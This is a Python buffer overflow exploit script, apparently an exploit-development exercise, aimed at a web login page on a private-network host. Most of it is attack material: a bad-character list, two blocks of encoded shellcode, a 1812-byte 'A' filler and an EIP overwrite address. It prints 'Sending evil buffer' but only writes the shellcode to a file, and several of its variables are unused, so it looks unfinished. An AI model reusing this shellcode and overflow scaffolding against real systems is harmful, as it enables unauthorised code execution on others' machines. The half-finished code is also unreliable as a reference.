#!/usr/bin/python3

import socket
import time
import sys

size = 800
host = "192.168.143.10"
port = 80
page = "login"
badchars = (
"\x01\x02\x03\x04\x05\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

shellcode = ("\xdb\xd7\xbb\x75\x61\x9e\x46\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x52\x31\x5a\x17\x83\xea\xfc\x03\x2f\x72\x7c\xb3\x33"
"\x9c\x02\x3c\xcb\x5d\x63\xb4\x2e\x6c\xa3\xa2\x3b\xdf\x13"
"\xa0\x69\xec\xd8\xe4\x99\x67\xac\x20\xae\xc0\x1b\x17\x81"
"\xd1\x30\x6b\x80\x51\x4b\xb8\x62\x6b\x84\xcd\x63\xac\xf9"
"\x3c\x31\x65\x75\x92\xa5\x02\xc3\x2f\x4e\x58\xc5\x37\xb3"
"\x29\xe4\x16\x62\x21\xbf\xb8\x85\xe6\xcb\xf0\x9d\xeb\xf6"
"\x4b\x16\xdf\x8d\x4d\xfe\x11\x6d\xe1\x3f\x9e\x9c\xfb\x78"
"\x19\x7f\x8e\x70\x59\x02\x89\x47\x23\xd8\x1c\x53\x83\xab"
"\x87\xbf\x35\x7f\x51\x34\x39\x34\x15\x12\x5e\xcb\xfa\x29"
"\x5a\x40\xfd\xfd\xea\x12\xda\xd9\xb7\xc1\x43\x78\x12\xa7"
"\x7c\x9a\xfd\x18\xd9\xd1\x10\x4c\x50\xb8\x7c\xa1\x59\x42"
"\x7d\xad\xea\x31\x4f\x72\x41\xdd\xe3\xfb\x4f\x1a\x03\xd6"
"\x28\xb4\xfa\xd9\x48\x9d\x38\x8d\x18\xb5\xe9\xae\xf2\x45"
"\x15\x7b\x54\x15\xb9\xd4\x15\xc5\x79\x85\xfd\x0f\x76\xfa"
"\x1e\x30\x5c\x93\xb5\xcb\x37\x5c\xe1\xa4\x48\x34\xf0\x4a"
"\x56\x7e\x7d\xac\x32\x90\x28\x67\xab\x09\x71\xf3\x4a\xd5"
"\xaf\x7e\x4c\x5d\x5c\x7f\x03\x96\x29\x93\xf4\x56\x64\xc9"
"\x53\x68\x52\x65\x3f\xfb\x39\x75\x36\xe0\x95\x22\x1f\xd6"
"\xef\xa6\x8d\x41\x46\xd4\x4f\x17\xa1\x5c\x94\xe4\x2c\x5d"
"\x59\x50\x0b\x4d\xa7\x59\x17\x39\x77\x0c\xc1\x97\x31\xe6"
"\xa3\x41\xe8\x55\x6a\x05\x6d\x96\xad\x53\x72\xf3\x5b\xbb"
"\xc3\xaa\x1d\xc4\xec\x3a\xaa\xbd\x10\xdb\x55\x14\x91\xeb"
"\x1f\x34\xb0\x63\xc6\xad\x80\xe9\xf9\x18\xc6\x17\x7a\xa8"
"\xb7\xe3\x62\xd9\xb2\xa8\x24\x32\xcf\xa1\xc0\x34\x7c\xc1"
"\xc0")

buf =  b""
buf += b"\xda\xdc\xba\xbc\xef\x39\x91\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\xea"
buf += b"\xfc\xdb\x64\xee\xeb\x9e\x87\x0e\xec\xfe\x0e\xeb"
buf += b"\xdd\x3e\x74\x78\x4d\x8f\xfe\x2c\x62\x64\x52\xc4"
buf += b"\xf1\x08\x7b\xeb\xb2\xa7\x5d\xc2\x43\x9b\x9e\x45"
buf += b"\xc0\xe6\xf2\xa5\xf9\x28\x07\xa4\x3e\x54\xea\xf4"
buf += b"\x97\x12\x59\xe8\x9c\x6f\x62\x83\xef\x7e\xe2\x70"
buf += b"\xa7\x81\xc3\x27\xb3\xdb\xc3\xc6\x10\x50\x4a\xd0"
buf += b"\x75\x5d\x04\x6b\x4d\x29\x97\xbd\x9f\xd2\x34\x80"
buf += b"\x2f\x21\x44\xc5\x88\xda\x33\x3f\xeb\x67\x44\x84"
buf += b"\x91\xb3\xc1\x1e\x31\x37\x71\xfa\xc3\x94\xe4\x89"
buf += b"\xc8\x51\x62\xd5\xcc\x64\xa7\x6e\xe8\xed\x46\xa0"
buf += b"\x78\xb5\x6c\x64\x20\x6d\x0c\x3d\x8c\xc0\x31\x5d"
buf += b"\x6f\xbc\x97\x16\x82\xa9\xa5\x75\xcb\x1e\x84\x85"
buf += b"\x0b\x09\x9f\xf6\x39\x96\x0b\x90\x71\x5f\x92\x67"
buf += b"\x75\x4a\x62\xf7\x88\x75\x93\xde\x4e\x21\xc3\x48"
buf += b"\x66\x4a\x88\x88\x87\x9f\x1f\xd8\x27\x70\xe0\x88"
buf += b"\x87\x20\x88\xc2\x07\x1e\xa8\xed\xcd\x37\x43\x14"
buf += b"\x86\xf7\x3c\x61\xd9\x90\x3e\x8d\xe5\x30\xb6\x6b"
buf += b"\x8f\xa0\x9e\x24\x38\x58\xbb\xbe\xd9\xa5\x11\xbb"
buf += b"\xda\x2e\x96\x3c\x94\xc6\xd3\x2e\x41\x27\xae\x0c"
buf += b"\xc4\x38\x04\x38\x8a\xab\xc3\xb8\xc5\xd7\x5b\xef"
buf += b"\x82\x26\x92\x65\x3f\x10\x0c\x9b\xc2\xc4\x77\x1f"
buf += b"\x19\x35\x79\x9e\xec\x01\x5d\xb0\x28\x89\xd9\xe4"
buf += b"\xe4\xdc\xb7\x52\x43\xb7\x79\x0c\x1d\x64\xd0\xd8"
buf += b"\xd8\x46\xe3\x9e\xe4\x82\x95\x7e\x54\x7b\xe0\x81"
buf += b"\x59\xeb\xe4\xfa\x87\x8b\x0b\xd1\x03\xbb\x41\x7b"
buf += b"\x25\x54\x0c\xee\x77\x39\xaf\xc5\xb4\x44\x2c\xef"
buf += b"\x44\xb3\x2c\x9a\x41\xff\xea\x77\x38\x90\x9e\x77"
buf += b"\xef\x91\x8a"



print("\nSending evil buffer")
filler = "A"  * 1812

eip = "\x30\x15\x40\x00"
f = open("exploit.txt", 'wb')
f.write(buf)
f.close()
sys.exit()


